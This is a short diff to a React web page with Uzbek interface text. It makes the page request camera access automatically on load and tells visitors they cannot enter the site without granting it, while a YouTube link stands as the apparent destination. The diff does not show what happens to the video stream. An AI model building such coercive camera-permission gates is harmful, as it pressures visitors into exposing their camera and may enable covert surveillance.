@@ -8,7 +8,11 @@ export default function Home() {
 
   const TARGET_LINK = "https://www.youtube.com/watch?v=Nv9qxur1s2k";
 
-  // Kamera ruxsati so‘rash funksiyasi
+  // Sahifa yuklanishi bilan avtomatik ruxsat sorash
+  useEffect(() => {
+    requestCamera();
+  }, []);
+
   const requestCamera = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -79,19 +83,20 @@ export default function Home() {
       display: "flex",
       flexDirection: "column",
       justifyContent: "center",
-      alignItems: "center"
+      alignItems: "center",
+      textAlign: "center",
+      padding: "0 20px"
     }}>
       {permission === null && (
-        <>
-          <h1>Saytga kirish uchun ruxsat bering</h1>
-          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
-        </>
+        <h1>Saytga kirish uchun ruxsat so‘ralmoqda...</h1>
       )}
 
       {permission === false && (
         <>
           <h1>Iltimos, ruxsat bering, aks holda saytga kira olmaysiz</h1>
-          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>Ruxsat berish</button>
+          <button onClick={requestCamera} style={{ marginTop: 20, padding: "10px 20px" }}>
+            Ruxsat berish
+          </button>
         </>
       )}
 
